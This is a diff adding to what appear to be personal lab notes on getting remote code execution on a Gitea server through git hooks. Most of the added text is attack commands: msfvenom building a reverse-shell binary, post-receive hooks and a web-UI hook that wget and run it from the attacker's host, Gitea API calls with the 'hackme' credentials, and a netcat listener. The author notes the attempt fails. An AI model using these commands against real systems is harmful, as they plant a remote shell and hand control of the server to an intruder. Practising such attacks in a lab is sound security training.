@@ -269,3 +269,89 @@ git add .
 git commit -m "binary"
 git push gitea master
 ```
+
+ok. ergh. trying a different approach.
+
+```bash
+
+# gen rev shell
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.52 LPORT=4444 -f elf -o /tmp/shell.elf
+
+# start web server
+python3 -m http.server 8080
+
+# trigger commit
+cd /tmp
+rm -rf exploit.git
+
+mkdir exploit.git
+cd exploit.git
+git init --bare
+
+# Create the hook that downloads and runs our static binary
+cat > hooks/post-receive << 'EOF'
+#!/bin/sh
+wget http://192.168.49.52:8080/shell.elf -O /tmp/shell.elf && chmod +x /tmp/shell.elf && /tmp/shell.elf &
+EOF
+chmod +x hooks/post-receive
+
+# Mark it safe for the daemon
+touch git-daemon-export-ok
+
+
+## start git daemon
+pkill git-daemon
+git daemon --reuseaddr --base-path=/tmp --export-all --enable=receive-pack &
+
+## create fresh git repo
+curl -s -X POST "http://192.168.52.67:3000/api/v1/user/repos" \
+  -u "hackme:hackme" \
+  -H "Content-Type: application/json" \
+  -d '{"name":"rce3","private":false}'
+  
+## start listener and push
+
+# In a new terminal
+nc -nvlp 4444
+
+# In your main terminal
+cd /tmp/exploit.git
+git remote add gitea3 "http://hackme:hackme@192.168.52.67:3000/hackme/rce3.git"
+git push --mirror gitea3
+```
+
+
+```bash
+
+curl -s -X POST "http://192.168.52.67:3000/api/v1/user/repos" \
+  -u "hackme:hackme" \
+  -H "Content-Type: application/json" \
+  -d '{"name":"final","private":false}'
+```
+
+### Step 4: Add the Hook via Web UI
+
+1. Go to: `http://192.168.52.67:3000/hackme/final/settings/hooks/git`
+2. Add a **`post-receive`** hook.
+3. Paste this exactly (no `&`, just a simple chain):
+```
+wget http://192.168.49.52:8080/shell.elf -O /tmp/s.elf && chmod +x /tmp/s.elf && /tmp/s.elf
+```
+
+### Step 5: Catch the Shell & Trigger
+
+```bash
+# In a new terminal, start your listener
+nc -nvlp 4444
+
+# In another terminal, push to trigger the hook
+cd /tmp/exploitsrc
+git remote add final http://hackme:hackme@192.168.52.67:3000/hackme/final.git
+git push final master
+```
+
+nope, it fails.
+
+tempted to shelve this and come back to it later.
+
+I must be missing something simple.
